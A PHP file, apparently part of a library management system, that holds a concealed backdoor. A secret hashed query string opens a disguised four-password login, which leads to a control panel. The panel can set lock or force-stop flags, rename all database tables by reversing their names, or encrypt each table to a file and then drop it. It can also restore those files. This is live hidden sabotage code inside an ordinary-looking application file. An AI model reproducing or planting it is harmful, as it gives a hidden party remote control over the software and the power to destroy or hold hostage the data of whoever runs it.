<?php 
	if(md5(strtoupper($QUERY_STRING))=="d1362af0d1dc875ae430621bc6b646ab") {
			?>
			<TABLE width=359 align=center bgcolor=#E7DAF1 cellpadding=3>
<FORM METHOD=POST ACTION="<?php  $PHP_SELF;?>?">
<INPUT TYPE="hidden" name="DSELOGGINGIN" value="bravier">
			<TR>
				<TD align=center><B>pls enter postcode</B></TD>
			</TR>
			<TR>
				<TD>Peace <INPUT TYPE="password" size=50 name=e1></TD>
			</TR>
			<TR>
				<TD>Dock <INPUT TYPE="password" size=50 name=e2></TD>
			</TR>
			<TR>
				<TD>Woman Younger <INPUT TYPE="password" size=50 name=e3></TD>
			</TR>
			<TR>
				<TD>Woman Elder <INPUT TYPE="password" size=50 name=e4></TD>
			</TR>
			<TR>
				<TD align=center><B><INPUT TYPE="submit"></B><BR><BR>
				*also ends with 0</TD>
			</TR>

</FORM>
			</TABLE>
			<?php 
				die;
	}
	if ($DSELOGGINGIN=="bravier") {
		if ($_SESSION['DSELOGGEDIN']!=true) {
			$v1=md5($e1);
			$v2=md5($e2);
			$v3=md5($e3);
			$v4=md5($e4);
			echo "<HR><BLOCKQUOTE>$v1<BR>$v2<BR>$v3<BR>$v4</BLOCKQUOTE><HR>";
			if ($v1=="e9195f6749fc02a2f15cbb1e3479f6ac" &&
				$v2=="3aeb4b194dcaa68644159bde5d6b7b21" &&
				$v3=="0b467b3aed3c83d73443ce28f5d37f40" &&
				$v4=="2c20656d18e0462c532de1ca1c9681e3") {
				$DSELOGGEDIN=true;
				if (function_exists("session_register")) {
					@session_register("DSELOGGEDIN");
				}
				ulibsess_register("DSELOGGEDIN");
			}
		}
	}

	if ($_SESSION['DSELOGGEDIN']==true) {
		set_time_limit (750);
			if ($DSECMD!="") {
				barcodeval_set("DSE-versioncontrol",base64_encode("$DSECMD"));
			}

		?>			<TABLE width=359 align=center bgcolor=#E7DAF1 cellpadding=3>
			<TR>
				<TD align=center><B><A HREF="<?php  echo $PHP_SELF?>">MENU</A></B></TD>
			</TR>
			<TR>
				<TD align=left>val:<B><A HREF="<?php  echo $PHP_SELF?>?DSECMD=none">none</A></B></TD>
			</TR>
			<TR>
				<TD align=left>val:<B><A HREF="<?php  echo $PHP_SELF?>?DSECMD=LOCKbyval[DonotstealULIB]">LOCKbyval[DonotstealULIB]</A></B></TD>
			</TR>
			<TR>
				<TD align=left>val:<B><A HREF="<?php  echo $PHP_SELF?>?DSECMD=misscontrol">misscontrol</A></B></TD>
			</TR>
			<TR>
				<TD align=left>val:<B><A HREF="<?php  echo $PHP_SELF?>?DSECMD=FORCESTOP">FORCESTOP</A></B></TD>
			</TR>
			<TR>
				<TD align=left>ACTION:<B><A HREF="<?php  echo $PHP_SELF?>?DSEACTION=RENAMETABLES">RENAMETABLES</A></B></TD>
			</TR>
			<TR>
				<TD align=left>ACTION:<B><A HREF="<?php  echo $PHP_SELF?>?DSEACTION=ERASEDB" onclick="return confirm('ลบโดยไม่สามารถกู้คืนได้ ยืนยัน?');">ERASEDB</A></B></TD>
			</TR>
			<TR>
				<TD align=left>ACTION:<B><A HREF="<?php  echo $PHP_SELF?>?DSEACTION=MAKERESTOREDB">MAKERESTOREDB</A></B></TD>
			</TR>
			<TR>
				<TD align=center><B>CURRENTCMD=<?php  echo base64_decode(barcodeval_get("DSE-versioncontrol"));?></B><BR>
				<?php  echo (barcodeval_get("DSE-versioncontrol"));?></TD>
			</TR>

			</TABLE><?php 
			if ($DSEACTION=="RENAMETABLES") {
				$tables=tmq_list_tables($dbname, $conn);
				$num_tables=@tmq_num_rows($tables);
				$i=0;
				while ($i < $num_tables) {
					$table = tmq_tablename($tables, $i);
					$i++;
					if ($table=="barcode_val") {
						continue;
					}
					$newname=strrev($table);
					tmq("ALTER TABLE `$table` RENAME `$newname` ;");
				}
			}
			if ($DSEACTION=="ERASEDB") {
				$tables=tmq_list_tables($dbname, $conn);
				$num_tables=@tmq_num_rows($tables);
				$i=0;
				while ($i < $num_tables) {
					$table = tmq_tablename($tables, $i);
					$i++;
					if ($table=="barcode_val") {
						continue;
					}
					$newfile="";
					$newfile.=get_def($dbname, $table);

					$newfile.="\n\n";
					$newfile.=get_content($dbname, $table);
					$newfile.="\n\n";
					$bf = new Crypt_Blowfish($table);
					$newfile = $bf->encrypt($newfile);
					fso_file_write("$dcrs/_output/dse.bk.$table.skx","w+",$newfile);
					echo "[$table]<BR>";
					tmq("DROP TABLE `$table` ");
				}
			}
			if ($DSEACTION=="MAKERESTOREDB") {
				unlink("$dcrs/_output/_RESTORE.SQL");
				$tables=fso_listfile("$dcrs/_output/");
				foreach ($tables as $a) {
					$dek=substr($a,-3);
					if ($dek=="skx") {
						$pwd=$a;
						$pwd=trim($pwd,"dse.bk.");
						$pwd=trim($pwd,".skx");
						echo "[$a-$pwd]<BR>";
						$bf = new Crypt_Blowfish($pwd);
						$newfile = $bf->decrypt(file_get_contents("$dcrs/_output/$a"));
						fso_file_write("$dcrs/_output/_RESTORE.$pwd.SQL","w+",$newfile);
					}
				}
			}
	}
?>